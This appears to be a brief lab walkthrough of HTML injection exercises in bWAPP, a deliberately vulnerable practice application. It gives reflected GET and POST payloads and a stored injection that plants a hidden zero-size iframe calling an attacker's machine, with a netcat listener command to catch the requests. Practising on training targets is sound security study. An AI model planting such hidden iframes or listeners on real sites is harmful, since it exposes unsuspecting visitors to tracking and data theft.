# A1 - Injection

### HTML Injection - Reflected (GET)
htmli_get.php

```
192.168.200.150/bWAPP/htmli_get.php?firstname=%3Ch1%3EHello%3C%2Fh1%3E&lastname=%3Ch2%3EWorld%3C%2Fh2%3E&form=submit
```

### HTML Injection - Reflected (POST)

```
<h1>Hello</h1>
<h2>World</h2>
```
### HTML Injection - Stored (Blog)

Following solution taken from:

```
<div class="code"><iframe SRC="http://192.168.200.130:775" height="0" width="0"></iframe></div>
```
Attacker's machine:
```
nc -lvp 775
```

